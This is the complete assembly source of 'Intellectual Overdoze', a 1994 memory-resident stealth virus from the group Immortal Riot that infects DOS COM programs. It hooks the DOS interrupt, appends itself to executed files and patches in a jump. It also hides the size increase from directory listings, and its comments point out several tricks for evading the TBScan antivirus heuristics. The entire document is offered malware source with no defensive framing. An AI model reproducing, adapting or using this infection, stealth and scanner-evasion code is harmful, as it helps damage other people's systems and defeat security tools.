; ------------------------------------------------------------------------------
;
;                       - Intellectual Overdoze -
;       Created by Immortal Riot's destructive development team
;              (c) 1994 The Unforgiven/Immortal Riot 
;
;-------------------------------------------------------------------------------
;          þ Memory Resident Stealth Infector of COM-programs þ
;-------------------------------------------------------------------------------
	.model  tiny
	.code
	org     100h

start:  

	jmp     virus_start                      ; for first generation only!
	db      'V'                              ; mark org file infected

virus_start:

	mov     sp,102h                          ; get delta offset without
	call    get_delta_offset                 ; getting detected by tbscan
					  
								 
get_delta_offset:

	call    cheat_tbscan                     ; kick's tbscan's heuristics
	mov     si,word ptr ds:[100h]            ; real bad!
	mov     sp,0fffeh
	sub     si,offset get_delta_offset
	jmp     short go_resident

cheat_tbscan:

	mov     ax,0305h                         ; keyb i/o           
	xor     bx,bx
	int     16h
	ret

go_resident:

	mov     bp,si                      

installtion_check:

	mov     ax,6666h                     
	int     21h
	cmp     bx,6666h                         ; 6666h returned in bx?
	je      already_resident                 ; = assume resident

	push    cs
	pop     ds

resize_memory_block:

	mov     ah,4ah                           ; find top of memory
	mov     bx,0ffffh                        ; (65536)
	int     21h                          

resize_memory_block_for_virus:

	sub     bx,(virus_end-virus_start+15)/16+1  ; resize enough para's
	mov     ah,4ah                              ; for virus
	int     21h

allocate_memory_block_for_virus:

	mov     ah,48h                               ; allocate for virus
	mov     bx,(virus_end-virus_start+15)/16
	int     21h
	jc      not_enough_mem                       ; not enough memory!

	dec     ax                                   ; ax - 1 = mcb
	push    es
	
mark_allocated_memory_block_to_dos:

	mov     es,ax
	mov     byte ptr es:[0],'Z'
	mov     word ptr es:[1],8                ; dos = mcb owner
	inc     ax

copy_virus_to_memory:

	cld                                      ; clear direction for movsw
	lea     si,[bp+offset virus_start]       ; vir start
	mov     es,ax
	xor     di,di
	mov     cx,(virus_end-virus_start+4)/2   ; vir len
	rep     movsw

manually_hook_of_int21h:

	xor     ax,ax
	mov     ds,ax
	push    ds                            
						 ; get/set int vector for int21
	lds     ax,ds:[21h*4]                                            
	mov     word ptr es:[oldint21h-virus_start],ax  
	mov     word ptr es:[oldint21h-virus_start+2],ds
	pop     ds
	mov     word ptr ds:[21h*4],(newint21h-virus_start)

	mov     bx,es                            ; cheat tbscan since
	mov     ds:[21h*4+2],bx                  ; mov ds:[21h*4+2],es = M flag

	push    cs                              
	pop     ds                                                      
						   
exit:
not_enough_mem:
already_resident:

	push    cs                                               
	pop     es                               

restore_first_bytes:

	mov     di,100h                       
	mov     cx,4                                                  
	mov     si,offset orgbuf              
	add     si,bp                            ; fix correct offset (delta)
	repne   movsb                            

jmp_org_program:
						 
	mov     ax,101h                          ; cheats tbscan's back to     
	dec     ax                               ; entry point
	jmp     ax                                    


newint21h:

	cmp     ax,4b00h                         ; file executed?
	je      infect                           
	
	cmp     ah,11h                           ; fcb findfirst call?
	je      fcb_stealth

	cmp     ah,12h                           ; fcb findnext call?
	je      fcb_stealth

	cmp     ax,6666h                         ; residency check            
	jne     do_old21h                        ; not resident
	mov     bx,6666h                         ; return marker in bx

do_old21h:

	jmp     dword ptr cs:[(oldint21h-virus_start)] ; jmp ssss:oooo
	ret                                     

fcb_stealth:

	pushf
	push    cs                               ; fake a int call with pushf
	call    do_old21h                        ; and cs, ip on the stack
	cmp     al,00                            ; dir successfull?
	jnz     dir_error                        ; naw, skip stealth routine!
	push    ax                              
	push    bx                              
	push    es                              
	mov     ah,51h                           ; Get active PSP to es:bx
	int     21h                             
	mov     es,bx                           
	cmp     bx,es:[16h]                      ; Dos calling it?
	jnz     not_dos                          ; Nope!
	mov     bx,dx                           
	mov     al,[bx]                          ; al = current drive
	push    ax                               
	mov     ah,2fh                           ; get dta area
	int     21h                              
	pop     ax                               ; check extended fcb 
	inc     al                               ; "cmp byte ptr [bx],0ffh"
	jnz     normal_fcb                       ; nope, regular fcb!

ext_fcb:
	add     bx,7h                            ; skip junkie if ext fcb

normal_fcb:

	mov     ax,es:[bx+17h]                   ; get second value
	and     ax,1fh
	xor     al,01h
	jnz     no_stealth                       ; second-stealth value match

; Here one should really check (i) if the file was a comfile, and (ii), 
; the file-size ( >472 bytes) But oh well, maybe to come.. 

	and     byte ptr es:[bx+17h],0e0h        ; substract virus len
	sub     es:[bx+1dh],(virus_end-virus_start)
	sbb     es:[bx+1fh],ax                  

no_stealth:
not_dos:

	pop     es                              
	pop     bx                              
	pop     ax                              
	
dir_error:   
	iret                                    
						
infect:

	push    ax                              
	push    bx                              
	push    cx
	push    dx
	push    di
	push    si
	push    ds
	push    es

open_file:

	mov     ax,3d02h                         ; open file in read/write
	int     21h                              ; mode
	jc      error_open                       ; error on file open
	
	xchg    ax,bx                            ; file handle in bx
		
	push    ds                              
	push    cs                              
	pop     ds                              

read_firstbytes:

	mov     ah,3fh                           ; read first four bytes
	mov     dx,(orgbuf-virus_start)          ; to orgbuf
	mov     cx,4                            
	int     21h                             


check_file_executed:

	cmp     byte ptr cs:[(orgbuf-virus_start)],'M'   ; check only first byte
	je      exe_file                                 ; - fooling tbscan
							  

check_previous_infection:

	cmp     byte ptr cs:[(orgbuf-virus_start)+3],'V' ; already infected?
	je      already_infected

	jmp     short get_file_time_date                 ; not infected

error_open:
already_infected:
exe_file:


	jmp     exit_proc                                ; dont infect file


get_file_time_date:

	mov     ax,5700h                                 ; get time/date
	int     21h

	mov     word ptr cs:[(old_time-virus_start)],cx  ; save time
	mov     word ptr cs:[(old_date-virus_start)],dx  ; and date
 
go_endoffile:

	mov     ax,4202h                                 ; go end of file
	xor     cx,cx
	cwd
	int     21h

check_file_size:

	cmp     ax,3072d                                 ; check file-size
	jb      too_small

	cmp     ax,64000d
	ja      too_big

create_newjump:

	sub     ax,3                                     ; 0e9h,XX,XX,
	mov     word ptr cs:[(newbuf+1-virus_start)],ax  ; V => AX

write_virus:

	mov     ah,40h                            ; write virus to end of file
	mov     cx,(virus_end-virus_start)
;       cwd                                       ; (dx = 0 since go eof)
	int     21h

go_tof:

	mov     ax,4200h
	xor     cx,cx
;       cwd                                        ; ( dx = 0 since go eof)
	int     21h


write_newjump:

	mov     ah,40h                             ; write new jmp to tof
	mov     cx,4                               ; = 0E9H,XX,XX,V
	mov     dx,(newbuf-virus_start)            ; offset to write from
	int     21h
	

set_org_time_date:
too_small:
too_big:

	mov     ax,5701h                                   ; set back org
	mov     word ptr cx,cs:[(old_time-virus_start)]    ; time
	mov     word ptr dx,cs:[(old_date-virus_start)]    ; date
	

set_stealth_marker:

	and     cl,0e0h                                    ; give file
	inc     cl                                         ; specific
	int     21h                                        ; second val

close_file:

	mov     ah,3eh                                     ; close file
	int     21h

exit_proc:

	pop     ds
	pop     es
	pop     ds
	pop     si
	pop     di
	pop     dx
	pop     cx
	pop     bx
	pop     ax

	jmp     dword ptr cs:[(oldint21h-virus_start)]     ; jmp ssss:oooo

old_date  dw    0                                          ; storage buffers
old_time  dw    0                                          ; for file time/date
oldint21h dd    ?                                          ; and oldint21h

orgbuf  db      0cdh,20h,00,00         ; buffer to save first 4 bytes in
newbuf  db      0E9h,00,00,'V'         ; buffer to calculate a new entry

copyrt  db      "[Overdoze] (c) 1994 The Unforgiven/Immortal Riot"

virus_end:
	end     start
